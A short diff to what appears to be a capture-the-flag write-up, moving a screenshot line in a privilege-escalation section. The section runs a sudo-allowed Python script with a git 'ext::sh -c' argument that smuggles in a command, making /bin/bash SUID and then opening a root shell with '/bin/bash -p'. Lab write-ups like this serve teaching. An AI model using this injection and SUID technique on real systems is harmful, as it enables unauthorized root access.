@@ -50,9 +50,9 @@
 - We tested the exploit with a Proof of Concept (PoC).  
 ![POC](POC.png)  
 - Initial reverse shell attempts failed, so we created a helper script called `set_root.sh` to enable the **SUID** bit on `/bin/bash`, allowing root execution.  
-![Root1](Root1.png)  
 - We executed it via the vulnerable script:  
-  `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /tmp/set_root.sh"`  
+  `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /tmp/set_root.sh"`
+![Root1](Root1.png)
 - With `/bin/bash` now SUID-enabled, we obtained a root shell using:  
   `/bin/bash -p`  
 ![Root2](Root2.png)  
